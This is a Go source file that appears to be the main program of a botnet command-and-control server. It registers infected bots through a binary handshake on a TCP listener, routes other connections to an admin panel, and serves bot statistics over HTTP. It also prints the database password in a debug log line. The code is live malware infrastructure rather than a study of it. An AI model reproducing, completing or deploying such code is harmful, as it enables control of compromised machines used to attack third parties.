package main

import (
	"encoding/json"
	"fmt"
	"log"
	"net"
	"net/http"
	"os"
	"time"
)

type Config struct {
	Server struct {
		Host string `json:"host"`
		Port int    `json:"port"`
	} `json:"server"`
	API struct {
		Host string `json:"host"`
		Port int    `json:"port"`
	} `json:"api"`
	Database struct {
		Addr  string `json:"addr"`
		User  string `json:"user"`
		Pass  string `json:"pass"`
		Table string `json:"table"`
	} `json:"database"`
	Misc struct {
		Cute string `json:"cute"`
	} `json:"misc"`
}

var (
	config     Config
	clientList = NewClientList()
	database   *Database
)

var (
	LogInfo  = "\033[96mINFO\x1b[0m: "
	LogError = "\033[91mERROR\x1b[0m: "
	LogWarn  = "\033[93mWARN\x1b[0m: "
	LogDebug = "\u001B[95mDEBUG\u001B[0m: "
)

func main() {
	loadConfig()
	log.Printf(LogDebug+"Config content: %+v\n", config)
	dbAddr := config.Database.Addr
	dbUser := config.Database.User
	dbPassword := config.Database.Pass
	dbName := config.Database.Table
	connectionString := fmt.Sprintf("%s:%s@tcp(%s)/%s", dbUser, dbPassword, dbAddr, dbName)
	log.Println(LogDebug+"Connection string:", connectionString+"\n")
	database = NewDatabase(dbAddr, dbUser, dbPassword, dbName)

	go Serve()
	//go setupbot()
	startAPIServer()
	startWebServer()
}

func loadConfig() {
	configData, err := os.ReadFile("config.json")
	if err != nil {
		log.Printf(LogError + fmt.Sprintf("Failed to read config.json: %s", err))
		return
	}

	log.Printf(LogInfo + "Config loaded!")

	err = json.Unmarshal(configData, &config)
	if err != nil {
		log.Printf(LogError + fmt.Sprintf("Failed to parse config.json: %s", err))
		return
	}
}

func netshift(prefix uint32, netmask uint8) uint32 {
	return uint32(prefix >> (32 - netmask))
}

func startAPIServer() {
	server := NewServer(clientList)

	apiAddr := fmt.Sprintf("%s:%d", config.API.Host, config.API.Port)
	http.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
		server.HandleRoot(w, r)
	})
	http.HandleFunc("/bot-statistics", server.HandleBotStatisticsAPI)
	go func() {
		err := http.ListenAndServe(apiAddr, nil)
		if err != nil {
			log.Printf(LogError + fmt.Sprintf("Error starting API server:", err))
		}
	}()

	log.Printf(LogInfo+"Serving WebServer on %s", apiAddr)
}

func startWebServer() {
	tel, err := net.Listen("tcp", fmt.Sprintf("%s:%d", config.Server.Host, config.Server.Port))
	if err != nil {
		log.Printf(LogError + fmt.Sprintf("Could not start C2 server: %s", err))
		return
	}

	log.Printf(LogInfo + fmt.Sprintf("Server started on %s:%d", config.Server.Host, config.Server.Port))

	for {
		conn, err := tel.Accept()
		if err != nil {
			continue
		}

		go initialHandler(conn)
	}
}

func initialHandler(conn net.Conn) {
	defer conn.Close()

	conn.SetDeadline(time.Now().Add(30 * time.Second))

	buf := make([]byte, 32)
	l, err := conn.Read(buf)
	if err != nil || l <= 0 {
		return
	}

	if l == 4 && buf[0] == 0x00 && buf[1] == 0x00 && buf[2] == 0x00 {
		if buf[3] > 0 {
			stringLen := make([]byte, 1)
			l, err := conn.Read(stringLen)
			if err != nil || l <= 0 {
				return
			}
			var source string
			if stringLen[0] > 0 {
				sourceBuf := make([]byte, stringLen[0])
				l, err := conn.Read(sourceBuf)
				if err != nil || l <= 0 {
					return
				}
				source = string(sourceBuf)
			}
			NewBot(conn, buf[3], source).Handle()
		} else {
			NewBot(conn, buf[3], "").Handle()
		}
	} else {
		NewAdmin(conn).Handle()
	}
}
